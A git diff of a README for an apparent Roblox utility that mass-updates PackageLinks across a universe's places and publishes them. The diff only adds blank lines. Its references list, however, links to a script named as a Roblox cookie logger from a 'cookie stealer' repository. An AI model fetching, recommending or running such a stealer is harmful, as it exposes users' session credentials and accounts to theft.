@@ -8,6 +8,7 @@ This project was built to fix that - and because I was kind of bored.
 ## What it does
 
 This tool scans every place in your experience/universe for PackageLinks. It then fetches the latest PackageLink asset and replaces the old version with the new one. After that, it publishes your places (with your permission!). Before publishing, it also generates local files so you can review the changes if you’d like.
+
 ---
 
 ## Requirements
@@ -39,4 +40,5 @@ Use this project **at your own risk**. I am not responsible for any potential is
 - [Roblox Open Cloud](https://create.roblox.com/docs/cloud)
 - [DevForum post on mass-updating places](https://devforum.roblox.com/t/publishing-all-places-of-a-universe-after-package-mass-update/1548534)
 - [Roblox Cookie Logger](https://raw.githubusercontent.com/SertraFurr/Roblox-Client-Cookie-Stealer/refs/heads/main/main.py)
+
 
